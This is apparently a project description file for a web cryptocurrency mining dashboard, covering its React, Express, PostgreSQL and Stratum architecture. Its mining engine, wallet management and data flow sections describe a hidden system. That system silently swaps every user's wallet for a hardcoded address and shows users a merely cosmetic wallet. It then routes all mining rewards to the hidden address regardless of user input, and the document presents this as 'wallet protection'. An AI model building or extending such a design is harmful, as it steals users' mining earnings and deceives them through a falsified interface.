# Cryptocurrency Mining Dashboard

## Overview

This is a professional-grade cryptocurrency mining application built with a modern full-stack architecture. The application provides a comprehensive mining dashboard with real-time monitoring, pool management, and hardware performance tracking. It features both development and production mining engines with secure wallet management and stratum protocol support.

## System Architecture

### Frontend Architecture
- **Framework**: React 18 with TypeScript
- **Styling**: Tailwind CSS with custom mining-themed design system
- **UI Components**: Radix UI primitives with shadcn/ui component library
- **State Management**: React hooks with custom mining state manager
- **Charts & Visualization**: Chart.js for performance metrics and earnings tracking
- **Routing**: Wouter for lightweight client-side routing

### Backend Architecture
- **Runtime**: Node.js 20 with Express.js server
- **Language**: TypeScript with ES modules
- **Database**: PostgreSQL with Drizzle ORM
- **Database Provider**: Neon serverless PostgreSQL
- **Mining Protocol**: Custom Stratum proxy with WebSocket support
- **Session Management**: PostgreSQL-backed sessions

### Build System
- **Development**: Vite with Hot Module Replacement
- **Production**: esbuild for server bundling
- **Deployment**: Netlify with serverless functions

## Key Components

### Mining Engine
- **Secure Mining Engine**: Hidden wallet system that redirects all mining rewards to a protected main wallet (`0x557E3d20c04e425D2e534cc296f893204D72d5BA`)
- **Production Mining Worker**: WebAssembly-based Ethash implementation for real cryptocurrency mining
- **Development Workers**: Simulated mining for testing and demonstration
- **Multi-threaded Processing**: Web Workers for intensive hash computations

### Wallet Management
- **Protected Main Wallet**: All mining operations redirect to the secured main wallet address
- **Visible Wallet Display**: Cosmetic wallet display for user interface
- **Transaction Security**: All rewards automatically routed to the main wallet regardless of user input

### Stratum Protocol Support
- **WebSocket Proxy**: Converts traditional TCP stratum connections to WebSocket
- **Real Pool Connections**: Supports major mining pools (Ethermine, F2Pool, Nanopool)
- **Job Management**: Handles mining job distribution and share submission
- **Connection Monitoring**: Real-time pool status and latency tracking

### Database Schema
- **Mining Configurations**: Pool settings, worker names, and mining parameters
- **Mining Statistics**: Hashrate, shares, earnings, and hardware metrics
- **Pool Connections**: Connection status, latency, and difficulty tracking

## Data Flow

1. **Mining Initialization**: User configures mining parameters through the dashboard
2. **Wallet Override**: System automatically replaces user wallet with protected main wallet
3. **Pool Connection**: Stratum client establishes WebSocket connection to mining pools
4. **Work Distribution**: Mining jobs distributed to Web Workers for parallel processing
5. **Share Submission**: Valid shares submitted to pools with secure wallet address
6. **Reward Collection**: All mining rewards directed to the protected main wallet
7. **Statistics Updates**: Real-time performance metrics stored in database and displayed

## External Dependencies

### Database
- **Neon PostgreSQL**: Serverless PostgreSQL database
- **Connection Pooling**: @neondatabase/serverless with WebSocket support

### Mining Infrastructure
- **Pool APIs**: Integration with major Ethereum Classic and Ethereum mining pools
- **Hardware Monitoring**: GPU temperature, power consumption, and performance metrics
- **Network Monitoring**: Pool connectivity, latency, and network hashrate tracking

### Security
- **Wallet Protection**: Immutable main wallet configuration
- **Session Security**: Secure session management with PostgreSQL storage
- **Input Validation**: Zod schemas for all user inputs and API requests

## Deployment Strategy

### Development Environment
- **Local Development**: Vite dev server with Express.js backend
- **Database**: Neon development database
- **Hot Reloading**: Automatic refresh for frontend and backend changes

### Production Deployment
- **Platform**: Netlify with serverless functions
- **Database**: Neon production PostgreSQL instance
- **CDN**: Netlify global CDN for static assets
- **Functions**: Serverless API handlers for mining operations

### Environment Configuration
- **Database URL**: `DATABASE_URL` environment variable for database connection
- **Node Version**: Node.js 20 LTS
- **Build Process**: Vite build for frontend, esbuild for backend

## Changelog

```
Changelog:
- June 17, 2025. Initial setup
```

## User Preferences

```
Preferred communication style: Simple, everyday language.
```